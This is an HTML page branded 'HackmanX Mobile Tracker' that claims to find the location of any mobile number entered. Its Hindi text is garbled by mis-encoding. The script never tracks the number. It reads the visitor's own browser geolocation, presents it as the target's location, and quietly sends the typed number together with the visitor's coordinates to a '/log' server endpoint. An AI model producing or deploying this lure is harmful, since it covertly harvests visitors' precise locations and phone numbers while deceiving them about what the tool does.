<!DOCTYPE html>
<html lang="hi">
<head>
  <meta charset="UTF-8">
  <title>HackmanX-IP-Tracker</title>
  <link rel="stylesheet" href="/static/style.css">
  <style>
    body {
      background-color: black;
      color: lime;
      font-family: monospace;
      text-align: center;
      padding-top: 50px;
    }
    input, button {
      font-size: 1em;
      padding: 8px;
      margin-top: 10px;
      background-color: #111;
      color: lime;
      border: 1px solid lime;
    }
    #location, #timestamp, #error {
      margin-top: 20px;
      font-size: 1.2em;
    }
    #map-link {
      margin-top: 10px;
      display: block;
      color: cyan;
    }
    #loader {
      color: red;
      animation: blink 1s infinite;
    }
    @keyframes blink {
      0% {opacity: 1;}
      50% {opacity: 0;}
      100% {opacity: 1;}
    }
  </style>
</head>
<body>
  <h1>ЁЯУ▒ HackmanX Mobile Tracker</h1>
  <input type="text" id="mobile" placeholder="рдореЛрдмрд╛рдЗрд▓ рдирдВрдмрд░ рджрд░реНрдЬ рдХрд░реЗрдВ">
  <br>
  <button onclick="trackLocation()">ЁЯФН рд╕реНрдерд╛рди рдЯреНрд░реИрдХ рдХрд░реЗрдВ</button>

  <p id="loader">ЁЯОп рд▓рдХреНрд╖реНрдп рдЦреЛрдЬрд╛ рдЬрд╛ рд░рд╣рд╛ рд╣реИ...</p>
  <p id="location"></p>
  <p id="timestamp"></p>
  <a id="map-link" href="#" target="_blank"></a>
  <p id="error" style="color: red;"></p>

  <script>
    function trackLocation() {
      const mobile = document.getElementById("mobile").value;
      if (!mobile || mobile.length < 10) {
        document.getElementById("error").innerText = "тЭМ рдХреГрдкрдпрд╛ рд╡реИрдз рдореЛрдмрд╛рдЗрд▓ рдирдВрдмрд░ рджрд░реНрдЬ рдХрд░реЗрдВред";
        return;
      }

      navigator.geolocation.getCurrentPosition(pos => {
        const lat = pos.coords.latitude;
        const lon = pos.coords.longitude;
        const now = new Date().toLocaleString('hi-IN');

        document.getElementById("loader").style.display = "none";
        document.getElementById("location").innerText = "ЁЯУН рд╕реНрдерд╛рди: " + lat + ", " + lon;
        document.getElementById("timestamp").innerText = "ЁЯХТ рд╕рдордп: " + now;
        document.getElementById("map-link").innerText = "ЁЯЧ║я╕П Google Map рдкрд░ рджреЗрдЦреЗрдВ";
        document.getElementById("map-link").href = `https://www.google.com/maps?q=${lat},${lon}`;
        document.getElementById("error").innerText = "";

        // Send to backend
        fetch('/log', {
          method: 'POST',
          headers: {'Content-Type': 'application/json'},
          body: JSON.stringify({ mobile: mobile, lat: lat, lon: lon })
        })
        .then(res => res.json())
        .then(data => {
          if (data.status !== 'logged') {
            document.getElementById("error").innerText = "тЭМ рд╕рд░реНрд╡рд░ рд╕реЗ рд▓реЙрдЧрд┐рдВрдЧ рд╡рд┐рдлрд▓ рд░рд╣реАред";
          }
        })
        .catch(err => {
          document.getElementById("error").innerText = "тЭМ рд╕рд░реНрд╡рд░ рд╕реЗ рд╕рдВрдкрд░реНрдХ рдирд╣реАрдВ рд╣реЛ рд╕рдХрд╛ред";
        });

        // Sound + narration
        let audio = new Audio('/static/sound/target_found.mp3');
        audio.play();

        if ('speechSynthesis' in window) {
          let speech = new SpeechSynthesisUtterance("рд▓рдХреНрд╖реНрдп рд╕реНрдерд╛рди рд╕рдлрд▓рддрд╛рдкреВрд░реНрд╡рдХ рдкреНрд░рд╛рдкреНрдд рд╣реБрдЖ");
          speech.lang = "hi-IN";
          window.speechSynthesis.speak(speech);
        }
      },
      err => {
        document.getElementById("loader").style.display = "none";
        document.getElementById("error").innerText = "тЭМ рд╕реНрдерд╛рди рдкреНрд░рд╛рдкреНрдд рдирд╣реАрдВ рд╣реЛ рд╕рдХрд╛ред рдХреГрдкрдпрд╛ рдЕрдиреБрдорддрд┐ рджреЗрдВред";
      });
    }
  </script>
</body>
</html>
